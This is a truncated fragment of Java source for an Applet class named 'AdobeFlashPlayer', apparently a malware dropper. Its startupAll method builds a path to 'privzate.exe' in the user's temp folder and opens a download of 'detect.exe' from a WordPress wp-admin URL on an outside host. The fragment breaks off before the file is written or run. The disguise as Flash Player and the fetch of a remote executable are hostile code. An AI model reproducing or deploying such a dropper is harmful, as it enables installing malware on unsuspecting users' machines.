...
public class AdobeFlashPlayer extends Applet
{
    public static void startupAll() {
        try {
            final String concat = System.getenv("TMP").concat("\\privzate.exe");
            final BufferedInputStream bufferedInputStream = new BufferedInputStream(new URL("http://www.athomewithcarellc.com/wp-admin/detect.exe").openStream());
